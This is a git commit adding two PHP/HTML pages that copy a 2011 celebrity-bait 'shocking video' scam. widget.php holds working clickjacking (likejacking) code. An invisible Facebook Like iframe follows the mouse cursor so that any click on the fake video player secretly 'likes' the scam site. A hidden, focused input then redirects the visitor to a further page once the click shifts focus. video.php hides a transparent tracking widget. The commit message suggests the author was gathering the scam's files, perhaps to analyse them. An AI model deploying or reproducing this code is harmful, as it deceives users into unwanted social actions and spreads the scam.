d35aeaaeb976275b0541b0db94db32a43bb14c47
uberj <jaxbr503@gmail.com>
2011-03-05 22:58:47 -0800

    tried to get all the files and map them out. need to make the code in small.js more readable.

---
+++ video.php
@@ -0,0 +1,38 @@
+<html>			
+<body bgcolor="#FFFFFF"> 
+<table width="400" border="0" cellspacing="0" cellpadding="0" align="center"> 
+  <tr> 
+    <td colspan="2"><a href="#"><img src="images/header.gif" width="980" height="56" border="0"></a><br> 
+    </td> 
+  </tr> 
+  <tr> 
+    <td> 
+      <table width="400" border="0" cellspacing="0" cellpadding="0"> 
+        <tr> 
+          <td height="35"><font size="5"><b>SICK! I lost all respect for Miley Cyrus when I watched this video!</b></font></td> 
+        </tr> 
+        <tr valign="top"> 
+          <td height="37" style="padding-left:18px;padding-top:2px" background="images/player_top.gif"><b><i><font color="#FFFFFF">ExclusiveVideos</font></i></b></td> 
+        </tr>         
+        <tr> 
+          <td style="background-image:url('images/center_img.jpg'); background-repeat: no-repeat;">            
+            <iframe allowTransparency="true" frameborder="0" border="0" style="width:640px; height:590px; border:0px; margin:0px;" scrolling="no" border="0" src="widget.php"></iframe> 
+            </td> 
+        </tr> 
+      </table> 
+    </td> 
+    <td> 
+   
+<a href="#"><img src="images/right.gif" width="308" height="648" border="0"></a> 
+    
+		<br><br><div style="padding-left:12px; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0;opacity: 0.0;"><script type="text/javascript" src="http://widgets.amung.us/small.js"></script><script type="text/javascript">WAU_small('gqse9rf2bewl')</script></div> 
+    </td> 
+  </tr> 
+  <tr>
+    <td colspan="2"><br> 
+      <a href="#"><img src="images/sig.gif" width="920" height="69" border="0"></a></td> 
+  </tr> 
+</table> 
+</body> 
+</html> 
+	
---
+++ widget.php
@@ -0,0 +1,47 @@
+<html>
+<body style="background-image: url(images/center_img.jpg); background-repeat: no-repeat; margin:0px"> 
+<div style="overflow: hidden; width: 100px; height: 100px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0;opacity: 0.0;" id="fbLikeFrame"><iframe src="http://www.facebook.com/plugins/like.php?href=http://mileyrespect.info/&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe></div> 
+<input type="text" onBlur="window.location = 'widget2.php'" id="Troll" style="width: 0px; height: 0px;"/> 
+<script type="text/javascript"> 
+document.getElementById('Troll').focus();
+    var myHTMLBody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body; var fbLikeFrame = document.getElementById('fbLikeFrame'); var myBoolean = 0;
+    function mouseFollower(e){
+	    if (window.event) { fbLikeFrame.style.top = (window.event.y-10)+myHTMLBody.scrollTop+'px'; fbLikeFrame.style.left = (window.event.x-10)+myHTMLBody.scrollLeft+'px'; } 
+ 
+	    else {fbLikeFrame.style.top = (e.pageY-10)+'px'; fbLikeFrame.style.left = (e.pageX-10)+'px';}
+    }   
+
+    document.onmousemove = function(e) {
+	   if (myBoolean == 0) {mouseFollower(e);} else fbLikeFrame.style.display = 'none';
+    }
+</script> 
+<table width="639" border="0" cellspacing="0" cellpadding="0"> 
+ 
+                <tr> 
+ 
+                  <td height="347"> 
+ 
+                    <div align="center"><img src="images/video_play.png"></div> 
+ 
+                  </td> 
+ 
+                </tr> 
+ 
+                <tr bgcolor="#FFFFFF"> 
+                  <td><img src="images/player_bt.gif"></td> 
+                </tr> 
+        <tr> 
+          <td> 
+            <img src="images/player_bt3.gif"> </td> 
+        </tr>        
+        <tr valign="top"> 
+          <td height="52" style="padding-top:15px;padding-left:8px" background="player_bt2.gif"><a href="#"><font size="2">mileyshock</font></a><br>Miley Cyrus needs to learn to keep her legs closed</td> 
+        </tr> 
+        <tr valign="top"> 
+          <td ><br> 
+            <br> 
+            <img src="images/comments.gif" border="0"></td> 
+        </tr> 
+      </table> 
+</body> 
+</html>
